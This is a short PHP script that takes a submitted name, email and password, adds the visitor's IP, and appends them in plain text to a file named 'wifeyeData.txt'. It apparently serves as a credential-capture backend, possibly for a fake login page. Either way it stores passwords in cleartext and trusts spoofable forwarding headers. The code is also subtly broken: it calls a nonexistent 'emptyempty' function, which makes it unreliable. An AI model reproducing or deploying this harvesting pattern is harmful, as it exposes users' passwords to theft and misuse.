<?php
    function getIPAddress() {  
        //whether ip is from the share internet  
        if(!emptyempty($_SERVER['HTTP_CLIENT_IP'])) {  
                    $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
        //whether ip is from the proxy  
        elseif (!emptyempty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
        }  
        //whether ip is from the remote address  
        else{  
                $ip = $_SERVER['REMOTE_ADDR'];  
        }  
        return $ip;  
    }

    $myfile = fopen("wifeyeData.txt", "a+");
    $ip = getIPAddress();  
    $data = $_POST['name'] . ' ' . $_POST['email'] . ' ' . $_POST['password'] . ' ' . $ip . "\r\n";
    $test = file_get_contents('wifeyeData.txt');
    if(!(strpos($test,$data) !== false)){
        $ret = fwrite($myfile,$data . "\r\n");
        if($ret === false) {
            die('There was an error writing this file');
        }
        else {
            echo "$ret bytes written to file";
        }
    }
    fclose($myfile);

?>
